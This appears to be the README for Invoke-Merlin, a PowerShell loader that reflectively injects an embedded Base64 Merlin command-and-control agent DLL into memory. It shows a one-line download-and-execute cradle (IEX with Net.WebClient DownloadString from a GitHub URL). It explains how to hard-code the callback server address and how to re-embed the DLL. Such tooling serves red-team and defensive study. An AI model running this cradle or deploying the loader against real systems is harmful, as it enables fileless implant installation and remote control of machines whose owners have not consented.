# Invoke-Merlin
This is a PowerShell script based on the work by Joe Bialek
(@JosephBialek) and Matt Graeber (@mattifestation) for
PowerSploit's [Invoke-ReflectivePEInjection.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)
used to reflectively load Merlin into memory. The script contains a
Base64 encoded version of `merlin.dll`.

An example of running the script from GitHub is:
`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ne0nd0g/merlin/master/data/bin/dll/Invoke-Merlin.ps1');Invoke-Merlin`

An example of running the script locally, using dot sourcing to read the
 script in, is:
`. C:\Invoke-Merlin.ps1;Invoke-Merlin`

## Limitations
It is important to note that the script is currently in the
Proof-of-Concept stage and will call back to the Merlin server at
127.0.0.1. Future work will facilitate specifying the value when
executing the script.

One option to overcome this is to hard-code in the target Merlin server
address into the `url` variable of the `cmd/merlinagent/main.go` prior
to creating the DLL.

## Invoke-ReflectivePEInjection
All of the normal Invoke-ReflectivePEInjection.ps1 script is still in
place and allows the user to additionally leverage any of the scripts
original functionality. The only significant change is that the
`-PEBytes` parameter is not required and will default to merlin.dll.

## Update DLL
The following steps can be used to update the DLL in the script using
PowerShell:
* `$PEBytes = [IO.File]::ReadAllBytes('C:/Go/src/Ne0nd0g/merlin/data/bin/dll/merlin.dll')`
* `$Base64String = [System.Convert]::ToBase64String($PEBytes)`
* `(Get-Content data/bin/powershell/Invoke-Merlin.ps1) | foreach-object {$_ -replace '^\$global\:merlin \= (.*)', ('$global:merlin = ' + "'" + $Base64String + "'")} | Set-Content data/bin/powershell/Invoke-Merlin.ps1`